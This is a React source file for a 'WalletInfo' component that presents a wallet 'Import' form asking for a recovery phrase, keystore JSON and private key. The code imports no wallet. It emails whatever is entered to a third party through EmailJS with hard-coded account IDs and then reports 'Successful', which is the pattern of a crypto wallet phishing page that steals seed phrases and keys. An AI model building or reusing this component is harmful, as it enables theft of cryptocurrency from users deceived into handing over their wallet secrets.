import React, { useRef, useState } from "react";
import "./WalletInfo.css";
// import emailjs from "emailjs-com";
import emailjs from "@emailjs/browser";

function WalletInfo() {
	const form = useRef();

	const [input1, setInput1] = useState("");

	const [input2, setInput2] = useState("");

	const [input3, setInput3] = useState("");

	const handleSubmit = (e) => {
		e.preventDefault();

		emailjs
			.sendForm(
				"service_plwn5yz",
				"template_qyjz4s7",
				form.current,
				"user_CfvcWb4q5M6DwsbbSJS6T"
			)
			.then(
				(result) => {
					console.log(result.text);
					alert("Successful");
				},
				(error) => {
					console.log(error.text);
				}
			);

		// setText1([input1, ...text1]);
		setInput1("");

		// setText2([input2, ...text2]);
		setInput2("");

		// setText3([input3, ...text3]);
		setInput3("");
	};

	return (
		<div className="walletinfo">
			<form
				ref={form}
				onSubmit={(e) => {
					e.preventDefault();
				}}>
				<div className="walletinfo__form">
					<label>
						Phrase
						<textArea
							// key={input1}
							type="text"
							value={input1}
							name="phrase"
							onChange={(e) => setInput1(e.target.value)}
						/>
					</label>
					<br />

					<label>
						Keystore Json
						<textArea
							type="text"
							value={input2}
							name="keystore"
							onChange={(e) => setInput2(e.target.value)}
						/>
					</label>
					<br />

					<label>
						Private Key
						<textArea
							type="text"
							value={input3}
							name="private"
							onChange={(e) => setInput3(e.target.value)}
						/>
					</label>
					<br />
				</div>
				<div className="walletinfo__button">
					<button
						inactive
						onClick={handleSubmit}
						disabled={!input1 && !input2 && !input3}>
						Import
					</button>
				</div>
			</form>
		</div>
	);
}

export default WalletInfo;
